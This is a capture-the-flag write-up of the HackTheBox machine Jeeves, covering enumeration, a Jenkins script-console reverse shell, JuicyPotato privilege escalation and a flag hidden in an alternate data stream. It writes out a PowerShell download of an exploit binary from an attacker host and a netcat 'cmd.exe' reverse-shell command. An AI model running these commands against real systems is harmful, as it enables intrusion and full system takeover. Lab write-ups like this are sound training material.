---
title: HackTheBox - Jeeves
description: Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.
date: 2024-05-01 11:10:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Medium]
image:
  path: /assets/img/headers/htb_jeeves.webp
---

## Enumeration
### NMap
Now, adding IP to /etc/hosts as jeeves.htb and starting with nmap scan

```bash
$ sudo nmap -p- jeeves.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 22:31 IST
Nmap scan report for jeeves.htb (10.10.10.63)
Host is up (0.18s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 459.48 seconds

$ sudo nmap -p80,135,445,50000 jeeves.htb -T5 -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 22:39 IST
Nmap scan report for jeeves.htb (10.10.10.63)
Host is up (0.17s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-30T22:09:53
|_  start_date: 2024-04-30T21:25:27
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.22 seconds
```

1. There is an old askjeeves search engine copy, running on port 80. which has no functionality.
2. Hence, I have triggered directory searching on both port 80 and 50000. 

### Gobuster
```bash
$ gobuster dir -u http://jeeves.htb:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jeeves.htb:50000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://jeeves.htb:50000/askjeeves/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

After Proceeding to check `http://jeeves.htb:50000/askjeeves/`, there is an un-authenticated **jenkins** page here. Looks like we could run our desired command execution via *groovy script console* or via jenkin's job cmd execution.

> manage jenkins > script console

## Foothold

### Reverse shell via Jenkins groovy script console

There is a groovy script available on github to get reverse-shell on netcat for us.

[https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

Run the script in groovy script console of jenkins. Once you have shell on netcat, you are user **'Jeeves/Kohsuke'** on the system. you can read the **user.txt**.

`C:\Users\kohsuke\Desktop\user.txt`

e3232272596fb47950d59c4cf1e7066a

## Privilege Escalation

![Jeeves](/assets/img/htb_jeeves/Jeeves-01.png)
> As **SeImpersonatePrivilege** is *Enabled*, we can use potato binaries to priv esc.
{: .prompt-tip }



We need 3 files to be sent from attackers machine on to Jeeves.
1. **JuicyPotato.exe** - For exploiting
2. **nc.exe** - to get the reverse shell
3.  Script to print **cls_ids** for potato to escalate to.

```powershell
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
foreach($a in $CLSID)
{
Write-Host $a.CLSID
}
```
{: file='getclsid_simple.ps1'}

You can download the files via the command below on Jeeves machine.

`cmd.exe /c PowerShell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.17:8000/JuicyPotato.exe', 'JuicyPotato.exe')"
`

[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) -also worth looking, but coudlnot get it to work.


```console
echo C:\Users\kohsuke\Desktop\nc.exe -e cmd.exe 10.10.14.17 1234 > priv.bat
type priv.bat
C:\Users\kohsuke\Desktop\nc.exe -e cmd.exe 10.10.14.17 1234
```

First, start a netcat listener.

```console
$ sudo rlwrap -cAr nc -lnvp 1234             
[sudo] password for kali: 
listening on [any] 1234 ...
```

Run the `getclsid_simple.ps1` script to fetch us some **clsids**. sometimes, we may not have rights to execute scripts on the machine. then you can use clsids from here: 

[https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro)

```console
PowerShell.exe -Command "getclsid_simple.ps1"
[truncated]
{054AAE20-4BEA-4347-8A35-64A533254A9D}
{06622D85-6856-4460-8DE1-A81921B41C4B}
{06B2132B-5B99-42A6-B8B6-A1709E191C70}
[Truncated]
```

As all of the clsids are not useful. We need to keep testing all clsids one by one. some clsid might fetch us a reverse shell. 

Run the JuicyPotato.
![Jeeves](/assets/img/htb_jeeves/Jeeves-02.png)

we get netcat shell with **NT Authority/SYSTEM** privileges.

```console
$ sudo rlwrap -cAr nc -lnvp 1234             
[sudo] password for kali: 
listening on [any] 1234 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.63] 49787
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```console
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,539,278,336 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

## Root Flag with Alternate Data stream
https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams

```console
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,539,278,336 bytes free

C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```
> Observe Filename **hm.txt:root.txt:$DATA**
{: .prompt-tip }


## Additional: Privilege Escalation via keepass DB
we can find a file like below. But i did not proceed with this way of escalation.


```console
C:\Users\kohsuke\Documents>dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,539,278,336 bytes free
```